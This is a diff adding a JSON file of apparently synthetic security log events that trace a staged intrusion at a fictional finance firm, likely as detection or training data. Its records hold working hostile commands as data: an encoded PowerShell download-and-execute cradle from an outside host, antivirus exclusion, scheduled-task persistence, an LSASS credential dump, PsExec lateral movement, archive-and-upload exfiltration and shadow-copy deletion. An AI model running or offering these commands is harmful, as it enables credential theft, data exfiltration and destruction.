@@ -1,0 +1,153 @@
+[
+  {
+    "_time": "2026-08-18T09:12:05.000Z",
+    "sourcetype": "ms:o365:reporting:messagetrace",
+    "sender_address": "billing-support@spoofed-vendor.com",
+    "recipient_address": "jdoe@apex-fin.com",
+    "subject": "Overdue Invoice Q3 - Urgent Settlement Required",
+    "attachment_name": "Invoice_Q3_9942.xlsm",
+    "sender_ip": "198.51.100.12",
+    "status": "Delivered"
+  },
+  {
+    "_time": "2026-08-18T09:14:10.000Z",
+    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+    "EventCode": 11,
+    "Computer": "FIN-WS-014.apex-fin.corp",
+    "User": "APEX\\jdoe",
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "ProcessId": 3210,
+    "TargetFilename": "C:\\Users\\jdoe\\Downloads\\Invoice_Q3_9942.xlsm"
+  },
+  {
+    "_time": "2026-08-18T09:14:11.000Z",
+    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+    "EventCode": 15,
+    "Computer": "FIN-WS-014.apex-fin.corp",
+    "User": "APEX\\jdoe",
+    "TargetFilename": "C:\\Users\\jdoe\\Downloads\\Invoice_Q3_9942.xlsm",
+    "Hashes": "MD5=d41d8cd98f00b204e9800998ecf8427e,SHA256=a7b8c9d0e1f234567890abcdef1234567890abcdef1234567890abcdef123456"
+  },
+  {
+    "_time": "2026-08-18T09:15:32.000Z",
+    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+    "EventCode": 1,
+    "Computer": "FIN-WS-014.apex-fin.corp",
+    "User": "APEX\\jdoe",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+    "ParentProcessId": 4820,
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "ProcessId": 6104,
+    "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcANwAvAHMAdABhAGcAZQAyAC4AcABzADEAJwApAA=="
+  },
+  {
+    "_time": "2026-08-18T09:15:33.000Z",
+    "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
+    "EventCode": 4104,
+    "Computer": "FIN-WS-014.apex-fin.corp",
+    "UserId": "APEX\\jdoe",
+    "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.77/stage2.ps1')"
+  },
+  {
+    "_time": "2026-08-18T09:22:15.000Z",
+    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+    "EventCode": 1,
+    "Computer": "FIN-WS-014.apex-fin.corp",
+    "User": "APEX\\jdoe",
+    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -Command Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp'"
+  },
+  {
+    "_time": "2026-08-18T09:22:18.000Z",
+    "sourcetype": "WinEventLog:Security",
+    "EventCode": 4698,
+    "Computer": "FIN-WS-014.apex-fin.corp",
+    "Message": "A scheduled task was created. Subject: Security ID: S-1-5-21-3982 Account Name: jdoe Task Name: \\Microsoft\\Windows\\AppUpdate\\Check Task Content: <Task><Exec><Command>powershell.exe</Command><Arguments>-nop -w hidden -c IEX (Get-Content C:\\Windows\\Temp\\updater.ps1)</Arguments></Exec></Task>"
+  },
+  {
+    "_time": "2026-08-18T09:40:02.000Z",
+    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+    "EventCode": 10,
+    "Computer": "FIN-WS-014.apex-fin.corp",
+    "SourceUser": "APEX\\jdoe",
+    "SourceImage": "C:\\Windows\\System32\\rundll32.exe",
+    "SourceProcessId": 7340,
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "GrantedAccess": "0x1010",
+    "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d424|C:\\Windows\\System32\\comsvcs.dll+1a240"
+  },
+  {
+    "_time": "2026-08-18T09:40:03.000Z",
+    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+    "EventCode": 1,
+    "Computer": "FIN-WS-014.apex-fin.corp",
+    "User": "APEX\\jdoe",
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "ProcessId": 7340,
+    "CommandLine": "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\Windows\\Temp\\lsass.dmp full"
+  },
+  {
+    "_time": "2026-08-18T09:40:05.000Z",
+    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+    "EventCode": 11,
+    "Computer": "FIN-WS-014.apex-fin.corp",
+    "User": "APEX\\jdoe",
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "TargetFilename": "C:\\Windows\\Temp\\lsass.dmp"
+  },
+  {
+    "_time": "2026-08-18T10:02:10.000Z",
+    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+    "EventCode": 1,
+    "Computer": "FIN-WS-014.apex-fin.corp",
+    "User": "APEX\\jdoe",
+    "Image": "C:\\Windows\\System32\\net1.exe",
+    "CommandLine": "net group \"Domain Admins\" /domain"
+  },
+  {
+    "_time": "2026-08-18T10:05:44.000Z",
+    "sourcetype": "WinEventLog:Security",
+    "EventCode": 4624,
+    "Computer": "FS-DATA-01.apex-fin.corp",
+    "Logon_Type": 3,
+    "TargetUserName": "svc_backup",
+    "IpAddress": "10.100.20.45",
+    "AuthenticationPackageName": "NTLM"
+  },
+  {
+    "_time": "2026-08-18T10:05:46.000Z",
+    "sourcetype": "WinEventLog:System",
+    "EventCode": 7045,
+    "Computer": "FS-DATA-01.apex-fin.corp",
+    "Message": "A service was installed in the system. Service Name: PSEXESVC Service File Name: %SystemRoot%\\PSEXESVC.exe Service Type: user mode service"
+  },
+  {
+    "_time": "2026-08-18T10:35:10.000Z",
+    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+    "EventCode": 1,
+    "Computer": "FS-DATA-01.apex-fin.corp",
+    "User": "APEX\\svc_backup",
+    "Image": "C:\\Program Files\\7-Zip\\7z.exe",
+    "CommandLine": "7z.exe a -p\"ExfilPass2026!\" -mhe=on C:\\Windows\\Temp\\Finance_2026_Export.7z \"D:\\Shares\\Finance\\*.*\""
+  },
+  {
+    "_time": "2026-08-18T10:42:15.000Z",
+    "sourcetype": "stream:http",
+    "src_ip": "10.100.10.20",
+    "dest_ip": "198.51.100.77",
+    "http_method": "POST",
+    "uri": "/upload",
+    "bytes_out": 92694120,
+    "status": 200
+  },
+  {
+    "_time": "2026-08-18T10:55:00.000Z",
+    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+    "EventCode": 1,
+    "Computer": "FS-DATA-01.apex-fin.corp",
+    "User": "APEX\\svc_backup",
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin.exe delete shadows /all /quiet"
+  }
+]
